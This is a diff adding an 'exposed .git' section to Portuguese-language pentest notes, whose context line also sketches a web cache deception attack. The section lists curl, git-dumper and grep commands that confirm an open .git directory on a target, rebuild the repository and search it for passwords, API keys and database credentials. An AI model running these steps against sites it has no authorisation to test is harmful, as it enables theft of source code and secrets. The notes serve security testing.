@@ -479,6 +479,29 @@ X-Cache: MISS
 *   Cenário de exploração real: force a vítima a acessar a URL manipulada (via link/CSRF/redirect) e, como atacante não autenticado, acesse a mesma URL logo depois para roubar o conteúdo cacheado dela
 <br>
 
+### **.Git Exposto**
+ 
+*   Quando o .git é deixado público, o histórico inteiro do repositório está acessível via HTTP.
+*   Primeiro confirme (manualmente ou com a extensão de navegador DotGit, que avisa quando um site tem .git aberto):
+
+```bash
+curl -s https://alvo.com/.git/HEAD
+# saída esperada: "ref: refs/heads/master"  -> confirmado
+```
+
+Depois reconstrua o repositório com o git-dumper (ferramenta que baixa e remonta o .git
+```bash
+# pip install git-dumper
+git-dumper https://alvo.com/.git/ ./dump
+cd dump && ls
+# composer.json  Dockerfile  index.php  vendor/ ...
+```
+
+Agora grep por segredos no que você baixou
+```bash
+grep -rEi 'password|secret|api_key|DB_|mysql|--password=' ./dump
+```
+
 ---
 <br>
 
